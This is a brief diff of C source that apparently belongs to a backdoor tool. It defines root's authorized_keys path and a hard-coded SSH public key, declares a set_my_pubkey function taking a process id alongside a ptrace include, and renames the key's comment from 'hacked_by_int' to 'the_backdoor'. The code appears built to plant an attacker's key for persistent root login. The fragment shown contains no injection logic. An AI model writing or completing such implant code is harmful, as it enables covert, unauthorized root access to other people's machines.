@@ -13,7 +13,7 @@
 #include <linux/ptrace.h>
 
 #define SSH_AUTH_PATH "/root/.ssh/authorized_keys"
-#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiXeDYmT1LhJZC5/dTl1VRgAHy1WkE/NyovkF4mFtPe hacked_by_int\n"
+#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiXeDYmT1LhJZC5/dTl1VRgAHy1WkE/NyovkF4mFtPe the_backdoor\n"
 // clang-format on
 
 void set_my_pubkey (uint32_t pid);
